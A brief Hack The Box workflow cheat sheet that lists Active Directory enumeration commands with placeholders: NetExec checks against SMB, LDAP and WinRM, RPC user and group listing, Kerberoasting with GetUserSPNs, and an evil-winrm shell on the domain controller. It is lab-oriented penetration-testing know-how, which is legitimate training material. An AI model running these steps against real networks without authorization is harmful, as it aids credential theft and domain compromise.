### Quick Htb Workflow

**Active Directory Enumeration Commands**

```bash
# 1. Verify credentials
nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>

# 2. Enumerate shares
nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares

# 3. Check user information / groups
net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>

# 4. Enumerate domain groups
net rpc group list -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>

# 5. Check LDAP
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>

# 6. Look for Kerberoastable accounts
GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# 7. Check WinRM access
nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>

# 8. If WinRM works, connect
evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
```
